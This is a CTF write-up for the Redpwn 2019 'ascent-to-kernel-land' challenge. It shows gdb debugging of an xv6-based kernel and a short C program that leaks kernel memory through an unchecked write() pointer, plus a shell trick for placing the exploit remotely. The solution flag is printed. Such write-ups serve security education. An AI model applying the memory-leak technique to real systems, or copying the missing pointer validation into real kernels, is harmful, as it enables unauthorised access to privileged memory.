---
layout: post
title:  "Redpwn CTF ascent-to-kernel-land Writeup"
img: redpwn-ascent.png
tags: [Redpwn, Writeup, CTF]
---

It's my first kernel exploit challenge writeup. Thank you Redpwn CTF!

## Description

We have a [tgz file](https://github.com/JackGrence/ctf-write-ups/raw/master/2019/RedpwnCTF/ascent-to-kernel-land/ascent-to-kernel-land.tar.gz), it is a lightweight OS. Follow the Makefile:

```make
qemu: fs.img xv6.img
        $(QEMU) -serial mon:stdio $(QEMUOPTS)

qemu-memfs: xv6memfs.img
        $(QEMU) -drive file=xv6memfs.img,index=0,media=disk,format=raw -smp $(CPUS) -m 256

qemu-nox: fs.img xv6.img
        $(QEMU) -nographic $(QEMUOPTS)

.gdbinit: .gdbinit.tmpl
        sed "s/localhost:1234/localhost:$(GDBPORT)/" < $^ > $@

qemu-gdb: fs.img xv6.img .gdbinit
        @echo "*** Now run 'gdb'." 1>&2
        $(QEMU) -serial mon:stdio $(QEMUOPTS) -S $(QEMUGDB)

qemu-nox-gdb: fs.img xv6.img .gdbinit
        @echo "*** Now run 'gdb'." 1>&2
        $(QEMU) -nographic $(QEMUOPTS) -S $(QEMUGDB)

```

These qemu targets can run or debug this OS in qemu. Start qemu and attach it:

```bash
$ make qemu-nox-gdb
*** Now run 'gdb'.
qemu-system-i386 -nographic -snapshot -drive file=fs.img,index=1,me...

gdb-peda$ target remote localhost:26000
```

According to README, the flag in kernel memory. We can find global variable `flag` defined in source code(main.c:9):

```c
#include "proc.h"
#include "x86.h"

char flag[70] = "REDACTED FROM SOURCE";

static void startothers(void);
static void mpmain(void) __attribute__((noreturn));
```

## How to get the flag?

But, how can we access the kernel memory? Have any vulnerabilities in system call? After a while, I found the program named `usertests`. It will crash the system!(usertests.c:1717):

```c
void argptest()
{
        int fd;
        fd = open("init", O_RDONLY);
        if (fd < 0) {
                printf(2, "open failed\n");
                exit();
        }
        read(fd, sbrk(0) - 1, -1); // Crash!
        close(fd);
        printf(1, "arg test passed\n");
}
```

The crash message:

```
$ ./usertests
usertests starting
unexpected trap 14 from cpu 1 eip 80104594 (cr2=0xd000)
lapicid 1: panic: trap
 801059ac 8010566f 80101a4c 80100fcc 80104b82 80104899 80105855 8010566f 0 0
```

Search `panic: ` in source code, we can find the crash message printed in consol.c:

```c
void panic(char *s)
{
        int i;
        uint pcs[10];

        cli();
        cons.locking = 0;
        // use lapiccpunum so that we can call panic from mycpu()
        cprintf("lapicid %d: panic: ", lapicid());
        cprintf(s);
        cprintf("\n");
        getcallerpcs(&s, pcs);
        for (i = 0; i < 10; i++)
                cprintf(" %p", pcs[i]);
        panicked = 1; // freeze other CPU
        for (;;)
                ;
}
```

Just `break panic` in gdb and see what's going on!

```
gdb-peda$ bt
#0  0x80100390 in panic ()
#1  0x801059ac in trap ()
#2  0x8010566f in alltraps () at trapasm.S:20
#3  0x8df23e6c in ?? ()
#4  0x80101a4c in readi ()
#5  0x80100fcc in fileread ()
#6  0x80104b82 in sys_read ()
#7  0x80104899 in syscall ()
#8  0x80105855 in trap ()
#9  0x8010566f in alltraps () at trapasm.S:20
#10 0x8df23fb4 in ?? ()
```

It's obvious that the read function failed because the 0xcfff is the end of the process address, we can't write more than one byte to it. (frame #4):

```
[-------------------------------------code-------------------------------------]
   0x80101a42 <readi+162>:      push   DWORD PTR [ebp-0x20]
   0x80101a45 <readi+165>:      add    esi,ebx
   0x80101a47 <readi+167>:      call   0x80104550 <memmove>
=> 0x80101a4c <readi+172>:      mov    edx,DWORD PTR [ebp-0x24]
   0x80101a4f <readi+175>:      mov    DWORD PTR [esp],edx
   0x80101a52 <readi+178>:      call   0x801001e0 <brelse>
   0x80101a57 <readi+183>:      add    DWORD PTR [ebp-0x20],ebx
   0x80101a5a <readi+186>:      add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0x8df23ec0 (0x0000cfff)
0004| 0x8df23ec4 --> 0x8010c990 --> 0x464c457f
0008| 0x8df23ec8 --> 0x200 --> 0x5d4835 ('5H]')
0012| 0x8df23ecc --> 0x80101a0f --> 0x5008ec83
```

## The magic!

This crash give me a hint! Can I access the kernel memory directly? Yes! I can!

```c
int main(int argc, char *argv[])
{
  write(1, 0x8010a000, 0x100);
}
```

In local, we can modify the Makefile, put the exploit program in.

```
$ ./hello
REDACTED FROM SOURCE5[>[G[P[Y[b[k[t[}[[[[[[[[[[\\\#\,\5\>\G\P\Y\b\k\t\}...
```

It works! But how can we do in remote?

* The command length is limited.
* The "\>\>" redirector can't append the content to the file.
* No any wget or nc in this OS.

Finally, `(cat file; echo -n \x00) > file` works for me!

Flag: `flag{k3rn3l_sp4ce_is_n0t_a_h1d1ng_pl4ce_08731048730417319374198732498}`

[Final exploit](https://github.com/JackGrence/ctf-write-ups/blob/master/2019/RedpwnCTF/ascent-to-kernel-land/exp.py)
